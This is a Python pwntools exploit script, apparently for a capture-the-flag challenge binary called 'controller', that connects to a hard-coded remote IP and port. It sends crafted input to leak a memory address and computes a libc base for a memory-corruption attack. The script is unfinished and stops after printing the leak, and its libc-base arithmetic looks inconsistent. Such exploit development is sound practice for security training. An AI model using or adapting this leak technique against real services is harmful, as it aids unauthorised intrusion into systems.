#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./controller')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or '178.62.113.165'
port = int(args.PORT or 31335)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x400FE5
continue
'''.format(**locals())

# -- Exploit goes here --
"""
for i in range(0xff):
    try:
        io = start()
        io.sendlineafter("Insert the amount of 2 different types of recources: ", f"{str(i)} -")
        io.sendlineafter("> ", "2")
        io.recvuntil(f" - -")
        leak = io.recvuntil(" ").strip(b" ").decode('utf-8') #0x3de2a0 0x7ffff7dcb2a0
        print(leak)
        print(hex(int(leak)))
    except :
        pass
    io.interactive()

"""
libc =ELF("./libc.so.6")
i=0
io = start()
io.sendlineafter("Insert the amount of 2 different types of recources: ", f"{str(i)} -")
io.sendlineafter("> ", "2")
io.recvuntil(f" - -")
leak = io.recvuntil(" ").strip(b" ").decode('utf-8') #0x3de2a0 0x7ffff7dcb2a0
print(leak)
print(hex(int(leak)))
libc_base = (int(leak) | 0x7fff00000000) - int(leak)

print(hex(libc_base))
print(hex(0x7fe2fcbae000))
pause()
io.close()